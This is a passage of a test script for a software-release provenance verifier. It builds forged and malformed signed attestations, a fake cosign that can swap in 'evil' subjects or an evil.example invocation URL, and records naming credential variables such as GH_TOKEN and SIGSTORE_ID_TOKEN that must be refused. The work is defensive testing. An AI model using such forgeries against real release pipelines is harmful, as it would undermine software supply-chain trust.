# (Codex #249 r4 B4, 001-AC4) a signed, logged provenance statement whose predicate is not a standard SLSA v1 record
def _drop(path):
    *head, last = path
    o = json.loads(json.dumps(SLSA_OK)); t = o
    for k in head: t = t[k]
    del t[last]; return o
def _set(path, v):
    o = json.loads(json.dumps(SLSA_OK)); t = o
    for k in path[:-1]: t = t[k]
    t[path[-1]] = v; return o
SLSA_BAD = {"slsa_empty": {}, "slsa_list": [], "slsa_nobd": _drop(["buildDefinition"]), "slsa_nord": _drop(["runDetails"]),
            "slsa_bdlist": _set(["buildDefinition"], []), "slsa_rdstr": _set(["runDetails"], "x"),
            "slsa_nobt": _drop(["buildDefinition", "buildType"]), "slsa_noext": _drop(["buildDefinition", "externalParameters"]),
            "slsa_nobuilder": _drop(["runDetails", "builder"]), "slsa_noid": _set(["runDetails", "builder"], {}),
            "slsa_emptyid": _set(["runDetails", "builder", "id"], ""), "slsa_numid": _set(["runDetails", "builder", "id"], 5)}
# (Codex #249 r5 B5 + Sonnet, the class closed) every SLSA v1 field Release reads has its type: TypeURI strings, objects, lists of objects
_DEP = {"uri": "git+https://github.com/fosterstack/cache@refs/tags/v0.3.0", "digest": {"gitCommit": "f" * 40}}
for _k, _v in (("null", None), ("empty", ""), ("num", 5), ("list", []), ("bool", True), ("noscheme", "x"), ("space", "https://a b"),
               ("nbsp", "https://a\u00a0b"), ("zw", "https://a\u200bb"), ("ctl", "https://a\x07b"), ("lead", " https://a")):
    SLSA_BAD["slsa_bt_" + _k] = _set(["buildDefinition", "buildType"], _v)
for _k, _v in (("notauri", "not a uri"), ("blank", " "), ("zw", "\u200b"), ("noscheme", "b"), ("nbsp", "https://a\u00a0b"),
               ("zwin", "https://a\u200bb"), ("nl", "https://a\nb"), ("bool", True), ("list", []), ("null", None), ("colon", "https:")):
    SLSA_BAD["slsa_id_" + _k] = _set(["runDetails", "builder", "id"], _v)
for _k, _v in (("str", "code"), ("null", None), ("list", []), ("num", 5), ("bool", True)):
    SLSA_BAD["slsa_ext_" + _k] = _set(["buildDefinition", "externalParameters"], _v)
for _k, _v in (("str", "x"), ("list", []), ("null", None)):
    SLSA_BAD["slsa_int_" + _k] = _set(["buildDefinition", "internalParameters"], _v)
for _k, _v in (("str", "x"), ("dict", {}), ("null", None), ("item_str", ["x"]), ("item_null", [None]), ("uri_num", [dict(_DEP, uri=5)]),
               ("uri_null", [dict(_DEP, uri=None)]), ("digest_list", [dict(_DEP, digest=[])]), ("digest_str", [dict(_DEP, digest="x")]),
               ("digest_val_num", [dict(_DEP, digest={"gitCommit": 5})]), ("digest_val_null", [dict(_DEP, digest={"gitCommit": None})])):
    SLSA_BAD["slsa_dep_" + _k] = _set(["buildDefinition", "resolvedDependencies"], _v)
for _k, _v in (("str", "x"), ("null", None), ("list", [])):
    SLSA_BAD["slsa_builder_" + _k] = _set(["runDetails", "builder"], _v)
for _k, _v in (("str", "1"), ("list", []), ("val_num", {"cosign": 5}), ("val_null", {"cosign": None})):
    SLSA_BAD["slsa_ver_" + _k] = _set(["runDetails", "builder", "version"], _v)
for _k, _v in (("str", "x"), ("list", []), ("null", None), ("inv_num", {"invocationId": 5}), ("inv_null", {"invocationId": None}),
               ("start_num", {"startedOn": 5}), ("finish_list", {"finishedOn": []})):
    SLSA_BAD["slsa_meta_" + _k] = _set(["runDetails", "metadata"], _v)
for _k, _v in (("str", "x"), ("dict", {}), ("item_str", ["x"]), ("item_num", [5])):
    SLSA_BAD["slsa_byp_" + _k] = _set(["runDetails", "byproducts"], _v)
for _k, _v in (("null", None), ("bool", True), ("str", "x"), ("num", 5)):
    SLSA_BAD["slsa_pred_" + _k] = _v
# the smallest valid SLSA v1 record (control): buildType, externalParameters {ref}, builder.id, nothing else
# (Codex #249 r7 B6, 001-AC4) every signed statement's subject list is checked at record-type time, provenance AND collection: a non-empty
# list of objects, each with a non-empty string name and a non-empty digest object of lowercase algorithm names and string values; sha1, sha256
# and sha512 values are lowercase hex of their length. Signed and logged, so only the subject check can refuse them.
_G = {"name": "apk", "digest": {"sha256": "a" * 64}}
SUBJ_BAD = {"absent": None, "null": "NULL", "num": 17, "dict": {}, "strlist": ["x"], "nodigest": [{"name": "x"}], "empty": [],
            "noname": [{"digest": {"sha256": "a" * 64}}], "emptyname": [dict(_G, name="")], "numname": [dict(_G, name=5)],
            "digestempty": [dict(_G, digest={})], "digestlist": [dict(_G, digest=["x"])], "digestnum": [dict(_G, digest={"sha256": 5})],
            "digestnull": [dict(_G, digest={"sha256": None})], "short": [dict(_G, digest={"sha256": "a" * 63})], "long": [dict(_G, digest={"sha256": "a" * 65})],
            "upper": [dict(_G, digest={"sha256": "A" * 64})], "nothex": [dict(_G, digest={"sha256": "g" * 64})], "sha1len": [dict(_G, digest={"sha1": "a" * 64})],
            "sha512len": [dict(_G, digest={"sha512": "a" * 64})], "algupper": [dict(_G, digest={"SHA256": "a" * 64})], "algempty": [dict(_G, digest={"": "a" * 64})],
            "second": [_G, {"name": "x"}]}
def _subj_payload(pt, subj, st="v1", pred=None):
    o = {"_type": STMT[st], "predicateType": pt, "predicate": pred if pred is not None else prov_predicate(pt, None)}
    if subj is not None: o["subject"] = None if subj == "NULL" else subj
    return json.dumps(o).encode()
for _k, _v in SUBJ_BAD.items():
    add("sign_subj_" + _k, PROV, None, payload=_subj_payload(PROV, _v))
    add("build_subj_" + _k, COLL, None, stmt="v0.1", payload=_subj_payload(COLL, _v, "v0.1", {"name": "build", "attestations": []}))
add("sign_subj_ok", PROV, None, payload=_subj_payload(PROV, [_G, {"name": "b", "digest": {"sha512": "b" * 128, "sha1": "c" * 40}}]))
add("build_subj_ok", COLL, None, stmt="v0.1", payload=_subj_payload(COLL, [{"name": "f", "digest": {"sha256": "a" * 64, "gitoid:sha1": "gitoid:blob:sha1:" + "b" * 40}}], "v0.1", {"name": "build", "attestations": []}))
add("sign_type_v02", PROV, None, payload=json.dumps({"_type": "https://in-toto.io/Statement/v0.2", "predicateType": PROV, "predicate": SLSA_OK, "subject": [_G]}).encode())
add("sign_ptype_num", PROV, None, payload=json.dumps({"_type": STMT["v1"], "predicateType": 5, "predicate": SLSA_OK, "subject": [_G]}).encode())
open(p("subj-bad.txt"), "w").write(" ".join(sorted(SUBJ_BAD)))
add("sign_slsa_min", PROV, D, predicate={"buildDefinition": {"buildType": "https://example.com/bt/v1", "externalParameters": {"ref": "refs/tags/v0.3.0", "workflow": "https://github.com/fosterstack/cache/.github/workflows/release.yml@refs/tags/v0.3.0"}},
                                                           "runDetails": {"builder": {"id": "https://example.com/builder"}}}, raw_predicate=True)
for _i, (_nm, _pr) in enumerate(sorted(SLSA_BAD.items())):
    add("sign_" + _nm, PROV, D, predicate=_pr, raw_predicate=True)
open(p("slsa-bad.txt"), "w").write(" ".join(sorted(SLSA_BAD)))
def _stmt(pt, subj, st="v1"): return json.dumps({"_type": STMT[st], "predicateType": pt, "predicate": prov_predicate(pt, None), "subject": subj}).encode()
add("sign_badname", PROV, None, payload=_stmt(PROV, [{"name": [], "digest": {"sha256": "a" * 64}}]))
add("sign_baddigest", PROV, None, payload=_stmt(PROV, [{"name": "apk", "digest": ["x"]}]))
add("build_baddigest", COLL, None, stmt="v0.1", payload=json.dumps({"_type": STMT["v0.1"], "predicateType": COLL, "predicate": {"name": "build"}, "subject": [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json", "digest": ["x"]}]}).encode())
# AC8 (Codex A/B r2): a SIGNED collection whose environment record names a token variable is refused by the next stage's verifier (verify and stage-start),
# whichever ACTIONS_ID_TOKEN_REQUEST_ name it is, not from a fixed list; the same record without the variable is accepted
def _envrec(var):
    att = [{"type": "https://witness.dev/attestations/environment/v0.1", "attestation": {"variables": {var: "x"}}}]
    return json.dumps({"_type": STMT["v0.1"], "predicateType": COLL, "predicate": {"name": "build", "attestations": att},
                       "subject": [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json", "digest": {"sha256": "1" * 64}}]}).encode()
add("build_env_custom", COLL, None, stmt="v0.1", payload=_envrec("ACTIONS_ID_TOKEN_REQUEST_CUSTOM"))
add("build_env_gh", COLL, None, stmt="v0.1", payload=_envrec("GH_TOKEN"))
add("build_env_runtime", COLL, None, stmt="v0.1", payload=_envrec("ACTIONS_RUNTIME_URL"))
add("build_env_sigstore", COLL, None, stmt="v0.1", payload=_envrec("SIGSTORE_ID_TOKEN"))   # round 1 F1: the one sigstore token release-sign holds
add("build_env_awstokfile", COLL, None, stmt="v0.1", payload=_envrec("AWS_WEB_IDENTITY_TOKEN_FILE"))   # handoff 0713 R2: the path of the token file the AWS SDK reads
add("build_env_awsrole", COLL, None, stmt="v0.1", payload=_envrec("AWS_ROLE_ARN"))                       # handoff 0713 R2: the role the token is exchanged for
add("build_env_clean", COLL, None, stmt="v0.1", payload=_envrec("HOSTNAME"))
# (X2) every envelope field has its JSON type; a wrong one is a refusal ("envelope"), never a traceback
for _nm, _ed in (("ptype_num", lambda r: r.__setitem__("payloadType", 5)), ("ptype_null", lambda r: r.__setitem__("payloadType", None)),
                 ("ptype_list", lambda r: r.__setitem__("payloadType", ["x"])), ("ptype_dict", lambda r: r.__setitem__("payloadType", {"a": 1})),
                 ("payload_num", lambda r: r.__setitem__("payload", 5)), ("sigs_dict", lambda r: r.__setitem__("signatures", {"a": 1})),
                 ("sigs_item", lambda r: r.__setitem__("signatures", [5])), ("sig_num", lambda r: r["signatures"][0].__setitem__("sig", 5)),
                 ("keyid_num", lambda r: r["signatures"][0].__setitem__("keyid", 5)), ("sig_null", lambda r: r["signatures"][0].__setitem__("sig", None)),
                 ("cert_null", lambda r: r["signatures"][0].__setitem__("certificate", None)), ("inter_str", lambda r: r["signatures"][0].__setitem__("intermediates", "x")),
                 ("inter_item", lambda r: r["signatures"][0].__setitem__("intermediates", [5])), ("stamps_str", lambda r: r["signatures"][0].__setitem__("timestamps", "x")),
                 ("stamps_item", lambda r: r["signatures"][0].__setitem__("timestamps", [5]))):
    mutate_field("sign_prov", "env_" + _nm, _ed)
    mutate_field("sign_prov", "env_" + _nm, _ed)
# ---- PR 4 (advisor 0386, read-back verifier-bindings): bind-items and check-list ----
# items.json is a PRODUCT of Build's record next to digests.json; the four Check records (scanners, acceptance, runtime, arm64) are Witness collections
# named for their step, signed by stage-sign.yml at the tag, whose MATERIAL file:witness-build/digests.json carries the sha256 of Build's digest list.
MAT = "https://witness.dev/attestations/material/v0.1/file:"
PRD = "https://witness.dev/attestations/product/v0.1/file:"
def _fsha(n): return hashlib.sha256(open(p(n), "rb").read()).hexdigest()
dj("items.json", {"image-production": D["image-production"], "image-fips": D["image-fips"], "lock-production": "sha256:" + "1" * 64})
dj("items-other.json", {"image-production": D["image-production"], "image-fips": D["image-fips"], "lock-production": "sha256:" + "2" * 64})
def _prods(items_name, digests_name="digests.json"):
    return [{"name": PRD + "digests.json", "digest": {"sha256": _fsha(digests_name)}}, {"name": PRD + "items.json", "digest": {"sha256": _fsha(items_name)}},
            {"name": "https://witness.dev/attestations/git/v0.1/commithash:" + "f" * 40, "digest": {"gitoid:sha1": "gitoid:commit:sha1:" + "f" * 40}}]
def _coll(step, subj): return json.dumps({"_type": STMT["v0.1"], "predicateType": COLL, "predicate": {"name": step, "attestations": []}, "subject": subj}).encode()
add("bi_ok", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json")))
add("bi_otheritems", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items-other.json")))
add("bi_noitems", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json")[:1] + _prods("items.json")[2:]))
add("bi_dup", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [{"name": PRD + "items.json", "digest": {"sha256": _fsha("items-other.json")}}]))
add("bi_material", COLL, None, stmt="v0.1", payload=_coll("build", [_prods("items.json")[0], {"name": MAT + "items.json", "digest": {"sha256": _fsha("items.json")}}]))
add("bi_otherkey", COLL, None, stmt="v0.1", key="other", payload=_coll("build", _prods("items.json")))
add("bi_unsigned", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json")), signed=False)
# REQ-CHAIN-007-AC19 (advisor ruling B): admission-baseline.json is a second product of Build's record, bound by `bind-items --product admission-baseline.json`
dj("admission-baseline.json", {"baseline": "requirements/releases/v0.3.0.yaml", "baseline_version": "v0.3.0", "sha": "c" * 40, "tag": "v0.3.1"})
dj("admission-baseline-other.json", {"baseline": "requirements/releases/v0.2.0.yaml", "baseline_version": "v0.2.0", "sha": "c" * 40, "tag": "v0.3.1"})
_PADM = {"name": PRD + "admission-baseline.json", "digest": {"sha256": _fsha("admission-baseline.json")}}
add("bi_adm", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [_PADM]))
add("bi_adm_dup", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [_PADM, dict(_PADM, digest={"sha256": _fsha("admission-baseline-other.json")})]))
add("bi_adm_material", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [dict(_PADM, name=MAT + "admission-baseline.json")]))
def _chk(name, step, key="rel", digests="digests.json", signed=True, subj=None):
    add(name, COLL, None, stmt="v0.1", signed=signed, key=key,
        payload=_coll(step, subj if subj is not None else [{"name": MAT + "witness-build/digests.json", "digest": {"sha256": _fsha(digests)}},
                                                        {"name": PRD + "check-results/%s.json" % step, "digest": {"sha256": "9" * 64}}]))
for _sn in ("scanners", "acceptance", "runtime", "arm64"): _chk("c_" + _sn, _sn)
for _sn in ("scanners", "acceptance", "runtime", "arm64"): _chk("co_" + _sn, _sn, digests="digests-other.json")      # all four agree with each other, not with Build's list
_chk("c_arm64_job", "check-arm64"); _chk("c_runtime_arm64name", "arm64")
_chk("c_scanners_otherkey", "scanners", key="other"); _chk("c_scanners_throwaway", "scanners", key="throwaway")
_chk("c_scanners_unsigned", "scanners", signed=False)
_chk("c_scanners_nomat", "scanners", subj=[{"name": PRD + "check-results/scanners.json", "digest": {"sha256": "9" * 64}}])
_chk("c_scanners_prodonly", "scanners", subj=[{"name": PRD + "witness-build/digests.json", "digest": {"sha256": _fsha("digests.json")}}])
_chk("c_scanners_dupmat", "scanners", subj=[{"name": MAT + "witness-build/digests.json", "digest": {"sha256": _fsha("digests.json")}}, {"name": MAT + "witness-build/digests.json", "digest": {"sha256": _fsha("digests-other.json")}}])
def _cl(dirname, slots):
    for slot, rec in slots.items():
        if rec is None: continue
        os.makedirs(p("%s/witness-%s" % (dirname, slot)), exist_ok=True)
        shutil.copy(p(rec + ".json"), p("%s/witness-%s/%s-collection.json" % (dirname, slot, slot)))
OK4 = {"scanners": "c_scanners", "acceptance": "c_acceptance", "runtime": "c_runtime", "arm64": "c_arm64"}
_cl("cl_ok", OK4)
_cl("cl_missing", dict(OK4, arm64=None))
_cl("cl_extra", dict(OK4, extra="c_scanners"))
_cl("cl_swapped", dict(OK4, scanners="c_acceptance", acceptance="c_scanners"))          # reordered: each record sits in the other's slot
_cl("cl_dup", dict(OK4, acceptance="c_scanners"))                                        # the scanners record presented twice
_cl("cl_subst", dict(OK4, runtime="c_scanners", acceptance="c_acceptance"))              # a substituted record under another name
_cl("cl_unverifiable", dict(OK4, runtime="c_scanners_unsigned"))
_cl("cl_wrongjob", dict(OK4, arm64="c_arm64_job"))
_cl("cl_otherkey", dict(OK4, scanners="c_scanners_otherkey"))
_cl("cl_throwaway", dict(OK4, scanners="c_scanners_throwaway"))
_cl("cl_nomat", dict(OK4, scanners="c_scanners_nomat"))
_cl("cl_prodonly", dict(OK4, scanners="c_scanners_prodonly"))
_cl("cl_dupmat", dict(OK4, scanners="c_scanners_dupmat"))
_cl("cl_alt_digests", {"scanners": "co_scanners", "acceptance": "co_acceptance", "runtime": "co_runtime", "arm64": "co_arm64"})
_cl("cl_onebad_digests", dict(OK4, runtime="co_runtime"))
os.makedirs(p("cl_stray/witness-scanners"), exist_ok=True)
_cl("cl_stray", OK4); open(p("cl_stray/witness-scanners/stray.json"), "w").write("{}")
_cl("cl_empty", {})
# REQ-CHAIN-006-AC4 / REQ-CHAIN-007-AC16 (advisor Oct 12, ruling G): check-results/govulncheck.json is a PRODUCT of Check's scanners record, which carries Build's digest
# list as its material; Release binds the file it uses to that product (bind-check), under Check's identity at the tag, as it binds items.json to Build's record
dj("gv.json", {"config": {"scanner_name": "govulncheck", "scanner_version": "v1.7.0"}})
dj("gv-other.json", {"config": {"scanner_name": "govulncheck", "scanner_version": "v9.9.9"}})
_GVP = PRD + "check-results/govulncheck.json"
def _gv(name, step="scanners", key="rel", digests="digests.json", signed=True, prods=None, mats=None):
    m = mats if mats is not None else [{"name": MAT + "witness-build/digests.json", "digest": {"sha256": _fsha(digests)}}]
    pr = prods if prods is not None else [{"name": _GVP, "digest": {"sha256": _fsha("gv.json")}}]
    add(name, COLL, None, stmt="v0.1", signed=signed, key=key, payload=_coll(step, m + pr))
_gv("gv_ok"); _gv("gv_otherfile", prods=[{"name": _GVP, "digest": {"sha256": _fsha("gv-other.json")}}])
_gv("gv_noprod", prods=[{"name": PRD + "check-results/scan-results.json", "digest": {"sha256": "9" * 64}}])
_gv("gv_dup", prods=[{"name": _GVP, "digest": {"sha256": _fsha("gv.json")}}, {"name": _GVP, "digest": {"sha256": _fsha("gv-other.json")}}])
_gv("gv_material", prods=[{"name": MAT + "check-results/govulncheck.json", "digest": {"sha256": _fsha("gv.json")}}])
_gv("gv_wrongstep", step="acceptance"); _gv("gv_otherdigests", digests="digests-other.json")
_gv("gv_nomat", mats=[]); _gv("gv_otherkey", key="other"); _gv("gv_unsigned", signed=False)

# ---- cutover prep (advisor Oct 12; REQ-CHAIN-001-AC6): the rc run's records, laid out like Release's own directories ----
# Every record is made for the release-candidate tag v0.3.0-rc1 (the identities of the policy made with --tag v0.3.0-rc1): Build's collection (digests.json and
# items.json products), Sign's provenance with its Rekor stub, Rebuild's collection, the four Check records, and the hostile verdict's results file.
dj("admission-baseline-rc.json", {"baseline": "requirements/releases/v0.3.0-rc1.yaml", "baseline_version": "v0.3.0-rc1", "sha": "c" * 40, "tag": "v0.3.0-rc1"})
dj("admission-baseline-final.json", {"baseline": "requirements/releases/v0.3.0.yaml", "baseline_version": "v0.3.0", "sha": "c" * 40, "tag": "v0.3.0"})
def _padm(n): return dict(_PADM, digest={"sha256": _fsha(n)})
add("rc_build", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [_padm("admission-baseline-rc.json")]))
add("rc_build_final", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json") + [_padm("admission-baseline-final.json")]))     # Q2a: Build's record of the run for the FINAL tag
add("rc_build_noadm", COLL, None, stmt="v0.1", payload=_coll("build", _prods("items.json")))
_RCC = os.environ.get("RC_COMMIT") or ("f" * 40)
def _src(commit): return {"buildDefinition": dict(slsa_ok(TRC)["buildDefinition"], resolvedDependencies=[{"uri": "git+https://github.com/fosterstack/cache@" + TRC, "digest": {"gitCommit": commit}}])}
add("rc_sign", PROV, D, ref=TRC, predicate=_src(_RCC))
add("rc_sign_othersrc", PROV, D, ref=TRC, predicate=_src("e" * 40))
add("rc_sign_nosrc", PROV, D, ref=TRC, predicate={"buildDefinition": dict(slsa_ok(TRC)["buildDefinition"], resolvedDependencies=[])})
add("rc_rebuild", COLL, None, stmt="v0.1", coll_file="digests.json", coll_name="rebuild")
add("rc_rebuild_other", COLL, None, stmt="v0.1", coll_file="digests-other.json", coll_name="rebuild")
for _sn in ("scanners", "acceptance", "runtime", "arm64"): _chk("rc_c_" + _sn, _sn)
_chk("rc_c_scanners_otherkey", "scanners", key="other")           # a Check record signed by a key the manifest does not name
_HF = {"mint_sign_cert": ("sign", "identity is stage-build.yml, not stage-sign.yml"), "read_sign_token": ("runner", "nothing usable"),
       "read_sign_key": ("runner", "nothing usable"), "hand_sign_code": ("sign", "digest list is not sha256 digests (format)"),
       "forge_provenance": ("release", "provenance signed by stage-build.yml, not stage-sign.yml")}
def _hrow(a, **k):
    r = {"attempt": a, "outcome": "refused", "stage": _HF[a][0], "reason": _HF[a][1], "judged_by": "verifier", "exit_code": 1}
    r.update(k); return r
_CTL = {"attempt": "positive_control", "outcome": "accepted", "stage": "sign", "reason": "ok", "judged_by": "verifier", "exit_code": 0}
dj("rc-hostile.json", {"attempts": [_hrow(a) for a in _HF] + [_CTL]})
dj("rc-hostile-accepted.json", {"attempts": [_hrow(a, outcome="accepted", exit_code=0) if a == "mint_sign_cert" else _hrow(a) for a in _HF] + [_CTL]})
dj("rc-hostile-missing.json", {"attempts": [_hrow(a) for a in _HF if a != "read_sign_key"] + [_CTL]})
dj("rc-hostile-exit2.json", {"attempts": [_hrow(a, exit_code=2) for a in _HF] + [_CTL]})
dj("rc-hostile-null.json", {"attempts": [None] + [_hrow(a) for a in _HF] + [_CTL]})
dj("rc-hostile-floatexit.json", {"attempts": [_hrow(a, exit_code=1.0) for a in _HF] + [_CTL]})
dj("rc-hostile-floatctl.json", {"attempts": [_hrow(a) for a in _HF] + [dict(_CTL, exit_code=0.0)]})
dj("rc-hostile-boolexit.json", {"attempts": [_hrow(a, exit_code=True) for a in _HF] + [_CTL]})
dj("rc-hostile-reworded.json", {"attempts": [_hrow(a, reason=_HF[a][1] + " ") for a in _HF] + [_CTL]})      # still a green verdict, other bytes
def rcdir(name, build="rc_build", sign="rc_sign", rebuild="rc_rebuild", hostile="rc-hostile", check=None, digests="digests.json", adm="admission-baseline-rc"):
    d = p(name)
    files = [("witness-build/build-collection.json", build + ".json"), ("witness-build/digests.json", digests), ("witness-build/items.json", "items.json"), ("witness-build/admission-baseline.json", adm + ".json"),
             ("provenance/provenance.json", sign + ".json"), ("provenance/provenance.rekor.json", sign + ".rekor.json"),
             ("witness-rebuild/rebuild-collection.json", rebuild + ".json"), ("hostile-results/hostile-results.json", hostile + ".json")]
    chk = {s: "rc_c_" + s for s in ("scanners", "acceptance", "runtime", "arm64")}
    chk.update(check or {})
    for slot, rec in chk.items():
        if rec is not None: files.append(("witness-check/witness-%s/%s-collection.json" % (slot, slot), rec + ".json"))
    for rel, src in files:
        os.makedirs(os.path.dirname(os.path.join(d, rel)), exist_ok=True)
        shutil.copy(p(src), os.path.join(d, rel))
rcdir("rc_ok")
rcdir("rc_badsign", sign="sign_othertag")
rcdir("rc_othersrc", sign="rc_sign_othersrc")
rcdir("rc_nosrc", sign="rc_sign_nosrc")
rcdir("rc_build_final", build="rc_build_final", adm="admission-baseline-final")
rcdir("rc_noadm", build="rc_build_noadm")
rcdir("rc_check_missing", check={"arm64": None})
rcdir("rc_check_otherkey", check={"scanners": "rc_c_scanners_otherkey"})
rcdir("rc_rebuild_other", rebuild="rc_rebuild_other")
rcdir("rc_hostile_accepted", hostile="rc-hostile-accepted")
rcdir("rc_hostile_missing", hostile="rc-hostile-missing")
rcdir("rc_hostile_reworded", hostile="rc-hostile-reworded")
rcdir("rc_hostile_exit2", hostile="rc-hostile-exit2")
rcdir("rc_hostile_null", hostile="rc-hostile-null")
rcdir("rc_hostile_boolexit", hostile="rc-hostile-boolexit")
rcdir("rc_hostile_floatexit", hostile="rc-hostile-floatexit")
rcdir("rc_hostile_floatctl", hostile="rc-hostile-floatctl")
print("fixtures ok")

PY
# the rc repository comes first: Sign's rc provenance names the rc tag's commit as its source (REQ-CHAIN-001-AC6)
CB="$root/bin/chain-bytes-sha.py"
RG="$work/rcrepo"
rcg() { git -C "$RG" -c user.name=t -c user.email=t@example.invalid -c commit.gpgsign=false -c tag.gpgsign=false "$@"; }
mkdir -p "$RG/.github/workflows" "$RG/.github/policy" "$RG/bin"
git -C "$RG" init -q -b main
for f in release stage-build stage-sign stage-verify; do printf 'name: %s\n' "$f" > "$RG/.github/workflows/$f.yml"; done
printf 'name: ci\n' > "$RG/.github/workflows/ci.yml"
cp "$CB" "$RG/bin/chain-bytes-sha.py" 2> /dev/null || printf 'x\n' > "$RG/bin/chain-bytes-sha.py"
printf '#!/bin/sh\necho b\n' > "$RG/bin/b.sh"; printf '#!/bin/sh\necho other\n' > "$RG/bin/other.sh"
printf '{"scripts":[{"path":"bin/chain-bytes-sha.py"},{"path":"bin/b.sh"}]}\n' > "$RG/.github/policy/chain-scripts.json"
printf '{"a":1}\n' > "$RG/.github/policy/x.json"; printf 'readme\n' > "$RG/README.md"
rcg add -A > /dev/null; rcg commit -q -m c1; rcg tag v0.3.0-rc1
C1=$(rcg rev-parse HEAD)
export RC_COMMIT=$C1
python3 "$work/fx.py" "$work" > "$work/fx.log" 2>&1 || { cat "$work/fx.log"; echo "FAIL fixture generation"; exit 1; }
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)

# fixture self-checks: the inputs are what the cases claim they are (so a refusal is about the claimed cause)
O=$OPENSSL
grep -F -q "fixtures ok" "$work/fx.log" && ok "fixture: the generator ran to its end" || bad "fixture: the generator did not finish"
[ "$($O pkey -pubin -in "$work/rel.pub" -text -noout | grep -c 'ASN1 OID: prime256v1')" = 1 ] && ok "fixture: the release key is ECDSA P-256" || bad "fixture: the release key"
[ "$($O pkey -in "$work/throwaway.key" -text -noout | head -n 1)" = "ED25519 Private-Key:" ] && ok "fixture: the building job's throwaway key is ed25519" || bad "fixture: the throwaway key"
python3 - "$work" <<'PY' && ok "fixture: the real envelope shape (one signature {keyid, sig}, no certificate, Statement v0.1 collection, policy payloadType)" || bad "fixture: envelope shape"
import base64, hashlib, json, sys
w = sys.argv[1]; r = lambda n: json.load(open(w + "/" + n + ".json"))
s = r("build_coll")["signatures"]
assert len(s) == 1 and set(s[0]) == {"keyid", "sig"} and s[0]["keyid"].startswith("awskms:///alias/"), s
st = json.loads(base64.b64decode(r("build_coll")["payload"]))
assert st["_type"] == "https://in-toto.io/Statement/v0.1"
sub = st["subject"][0]
assert sub["name"] == "https://witness.dev/attestations/product/v0.1/file:digests.json" and set(sub["digest"]) == {"sha256", "gitoid:sha1", "gitoid:sha256"}, sub
assert sub["digest"]["sha256"] == hashlib.sha256(open(w + "/digests.json", "rb").read()).hexdigest()
for k in ("upper", "sha512", "codename", "dotdotname", "hex65", "newline", "prefixed", "emptyname", "underscorename", "emptyobj", "newlinename", "unicodename", "unicodehex", "fullwidthhex"):   # the format cases ATTEST their own file, so equality cannot be what refuses them
    s2 = json.loads(base64.b64decode(r("build_coll_" + k)["payload"]))["subject"][0]["digest"]["sha256"]
    assert s2 == hashlib.sha256(open(w + "/digests-%s.json" % k, "rb").read()).hexdigest(), k
assert r("release_policy")["payloadType"] == "https://witness.testifysec.com/policy/v0.1"
PY

# ---- harness ----------------------------------------------------------------------------------------------------
[ -f "$cv" ] && ok "bin/chain-verify.py exists" || bad "bin/chain-verify.py does not exist (RED: not implemented yet)"
# a fake `cosign` (test-generated, first on PATH): implements only the pinned call
#   cosign attest-blob --yes --key awskms:///alias/fosterstack-release-signing --signing-config CFG --statement S --bundle B
# (cosign v3.1.3 cmd/cosign/cli/attest_blob.go; --key names the KMS key by its alias; --signing-config selects the services, here the
# committed .github/policy/cosign-signing-config.json, which names one Rekor, v1, and no Fulcio, no sign-in service and no timestamp authority). It signs the DSSE PAE
# with the release key and writes a bundle in the protobuf-JSON shape (mediaType ...bundle.v0.3+json): dsseEnvelope and
# verificationMaterial.publicKey.hint. Synthetic: the first real run (task T1) captures a genuine bundle to replace this fixture. The fake
# records its argv so the test pins it, and refuses a signing config that names a service.
cp "$root/.github/policy/cosign-signing-config.json" "$work/cosign-signing-config.json" 2> /dev/null || echo '{"missing":true}' > "$work/cosign-signing-config.json"
mkdir -p "$work/fakebin"
cat > "$work/fakebin/cosign" <<FAKE
#!/usr/bin/env bash
set -euo pipefail
printf '%s\n' "\$*" >> "$work/cosign-argv.log"
[ "\$#" = 10 ] && [ "\${1}" = attest-blob ] && [ "\${2}" = --yes ] && [ "\${3}" = --key ] && [ "\${4}" = awskms:///alias/fosterstack-release-signing ] \
  && [ "\${5}" = --signing-config ] && [ "\${7}" = --statement ] && [ "\${9}" = --bundle ] || { echo "fake cosign: unexpected argv: \$*" >&2; exit 2; }
exec python3 - "\${6}" "\${8}" "\${10}" "$work" <<'PYF'
import base64, json, os, subprocess, sys
cfg, st, out, w = sys.argv[1:5]
SSL = os.environ.get("OPENSSL", "openssl")
def sh(*a): return subprocess.run((SSL,) + a, capture_output=True, check=True).stdout
b64 = lambda b: base64.b64encode(b).decode()
conf = json.load(open(cfg))
for service in ("caUrls", "oidcUrls", "tsaUrls"):
    assert conf.get(service) == [], "the signing config must name no " + service
assert len(conf.get("rekorTlogUrls", [])) == 1 and conf["rekorTlogUrls"][0].get("majorApiVersion") == 1, "the signing config must name exactly one Rekor, v1"
body = open(st, "rb").read(); pt = "application/vnd.in-toto+json"
# FAKE_BUNDLE: a cosign that signs ANOTHER statement than the one Sign handed it (the bundle is otherwise genuine), or returns a bundle with
# something that must not be there or no signature that verifies
mode = os.environ.get("FAKE_BUNDLE", "")
if mode in ("swapsubj", "predicate", "addsubj", "dry1", "dry1f"):
    stm = json.loads(body)
    if mode == "dry1": stm["predicate"]["dryRun"] = 1          # 1 where Sign built true (Python says 1 == True)
    if mode == "dry1f": stm["predicate"]["dryRun"] = 1.0       # 1.0 where Sign built true
    if mode == "swapsubj": stm["subject"] = [{"name": "evil", "digest": {"sha256": "f" * 64}}]
    if mode == "predicate": stm["predicate"]["runDetails"]["metadata"]["invocationId"] = "https://evil.example/run/1"
    if mode == "addsubj": stm["subject"].append({"name": "evil", "digest": {"sha256": "f" * 64}})
    body = json.dumps(stm, sort_keys=True).encode()
pae = b"DSSEv1 %d %s %d %s" % (len(pt), pt.encode(), len(body), body)
open(w + "/fake.pae", "wb").write(pae)
key = "other" if mode == "otherkey" else "rel"
sig = sh("dgst", "-sha256", "-sign", w + "/" + key + ".key", w + "/fake.pae")
